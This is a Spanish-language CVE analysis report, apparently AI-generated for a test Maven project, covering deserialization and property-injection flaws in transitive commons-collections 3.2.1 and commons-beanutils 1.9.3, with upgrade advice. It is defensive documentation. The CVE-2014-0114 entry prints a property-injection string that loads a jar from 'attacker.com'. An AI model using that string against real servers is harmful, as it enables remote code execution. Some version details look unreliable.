# CVE Analysis Report — 04_transitive_only_n3

**Scan Date:** 2026-04-03  
**Tool:** GitHub Copilot + appmod-validate-cves-for-java (GitHub Security Advisories)  
**Total CVEs Found:** 5  
**Severities:** 1 CRITICAL · 4 HIGH

---

## Project Description

Aplicación Maven **multi-módulo** (`app` + `lib-core`) con **vulnerabilidades exclusivamente en nivel N3 (transitivas de segundo nivel)**. Las cadenas de dependencias son:

```
app → lib-core → struts2-core → commons-collections:3.2.1   (N3)
app → lib-core → struts2-core → commons-beanutils:1.9.3      (N3)
```

Ni las dependencias directas ni las de primer nivel tienen CVEs propios, pero las transitivas de segundo nivel incluyen librerías con gadgets de deserialización RCE históricos.

Este proyecto demuestra que **la profundidad no protege contra vulnerabilidades**: las dependencias N3 son igualmente explotables si el vector de ataque es deserialización.

---

## Dependency Summary

| Artifact | Version | Level | CVE Count |
|---|---|---|---|
| `commons-collections` | 3.2.1 | N3 (transitivo de 2do nivel) | 2 |
| `commons-beanutils` | 1.9.3 | N3 (transitivo de 2do nivel) | 3 |

---

## CVE Detail

### commons-collections : commons-collections : 3.2.1

#### CVE-2015-7501 — CRITICAL — RCE via deserialization (el CVE original de Java deserialization)
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** El `InvokerTransformer` de Apache Commons Collections permite encadenar invocaciones de métodos Java arbitrarios como parte de la deserialización de objetos. Un atacante puede construir un objeto serializado malicioso que, al ser deserializado por `ObjectInputStream`, ejecuta código arbitrario via la cadena: `Runtime.exec()` → `InvokerTransformer` → método de sistema operativo.
- **Contexto histórico:** Este fue el CVE inicial que reveló el amplio problema de gadgets en el ecosistema Java. Los investigadores Frohoff y Lawrence lo presentaron en 2015 ("Marshalling Pickles") afectando JBoss, WebLogic, Jenkins y decenas de servidores Java.
- **Impacto:** RCE sin autenticación en cualquier endpoint Java que deserialice datos no confiables. La sola presencia de la librería en el classpath es suficiente (no es necesario que la aplicación la use directamente).
- **Remediación:** Actualizar a `commons-collections:3.2.2`.
- **Referencia:** https://github.com/advisories/GHSA-fjq5-5j5f-mvxh

#### CVE-2015-6420 — HIGH — RCE via deserialization (variante)
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** Variante del mismo gadget de `InvokerTransformer`. Usa una cadena de invocación ligeramente diferente pero logra el mismo efecto: RCE via deserialización de objetos fabricados que contienen referencias a `InvokerTransformer`.
- **Impacto:** Igual que CVE-2015-7501, RCE via deserialización Java.
- **Remediación:** Actualizar a `commons-collections:3.2.2`.
- **Referencia:** https://github.com/advisories/GHSA-6hgm-866r-3cjv

---

### commons-beanutils : commons-beanutils : 1.9.3

#### CVE-2014-0114 — HIGH — Arbitrary Class Property Injection
- **Tipo:** Remote Code Execution via Property Injection
- **Descripción:** `PropertyUtils.getProperty()` y métodos relacionados en Commons BeanUtils permiten invocar setters arbitrarios durante la population de beans, incluyendo el setter `setClass()`. Esto permite cambiar el `ClassLoader` de un bean, con posibilidad de cargar clases maliciosas. El vector de ataque típico es un form web que pasa parámetros directamente a `BeanUtils.populate()`.
- **Impacto:** En frameworks que usan Commons BeanUtils para binding (Spring MVC antiguo, Struts1, etc.), un atacante puede inyectar la propiedad `class.classLoader.urls[0]=jar:http://attacker.com/evil.jar!/` para cargar código remoto.
- **Remediación:** Actualizar a `commons-beanutils:1.11.0` que incluye protección de `ClassLoader`.
- **Referencia:** https://github.com/advisories/GHSA-v67j-xgg8-7q34

#### CVE-2019-10086 — HIGH — Access Control Bypass
- **Tipo:** Access Control Bypass
- **Descripción:** `BeanIntrospector` de Commons BeanUtils expone propiedades de la clase Java que no deberían ser accesibles (en particular `getClass()`). Aplicaciones que usan `BeanUtilsBean.populate()` con input del usuario pueden tener bypass de controles de acceso si no excluyen explícitamente la propiedad `class`.
- **Impacto:** Bypass de validaciones de acceso en aplicaciones que no filtran la propiedad `class` de los beans expuestos.
- **Remediación:** Actualizar a `commons-beanutils:1.11.0`.
- **Referencia:** https://github.com/advisories/GHSA-p66x-2cv9-qq3v

#### CVE-2025-48734 — HIGH — RCE via deserialization gadget
- **Tipo:** Remote Code Execution (RCE)
- **Descripción:** `BeanComparator` en Commons BeanUtils puede usarse como gadget de deserialización cuando un `ClassLoader` atacante está disponible en el classpath. La combinación de `BeanComparator` con Commons Collections u otras librerías de gadgets permite construir payloads de deserialización RCE. Descubierto en 2025 como una nueva cadena de gadgets.
- **Impacto:** RCE via deserialización Java en aplicaciones con commons-beanutils en el classpath.
- **Remediación:** Actualizar a `commons-beanutils:1.11.0`.
- **Referencia:** https://github.com/advisories/GHSA-4265-qqm6-4wfv

---

## Remediation Summary

| Dependency | Current Version | Fix Version |
|---|---|---|
| `commons-collections` | 3.2.1 | **3.2.2** |
| `commons-beanutils` | 1.9.3 | **1.11.0** |

Nota: Al ser dependencias N3 (transitivas de segundo nivel), la remediación requiere actualizar las dependencias intermedias que las introducen, o usar `<dependencyManagement>` en Maven para forzar versiones específicas.

---

## AI Analysis Notes

Este proyecto ilustra el **problema de gadgets de deserialización en dependencias profundas**:
- Los CVEs de commons-collections (2015) y commons-beanutils son históricos pero siguen activos en librerías sin actualizar.
- **Punto clave:** La vulnerabilidad no requiere que la aplicación use estas librerías directamente. Si están en el classpath y el servidor deserializa datos no confiables (cualquier endpoint `ObjectInputStream`, RMI, JMX), son explotables.
- La cadena de transitividad N3 hace que estos riesgos sean invisibles para el desarrollador que solo revisa su `pom.xml` directamente.
- **commons-collections 3.2.1 → 3.2.2** es el fix más simple (un incremento de versión minor) pero el de mayor impacto, bloqueando el gadget `InvokerTransformer` más conocido.
- **CVE-2025-48734** demuestra que commons-beanutils sigue siendo activamente investigado como vector de deserialization; no es un problema "resuelto".
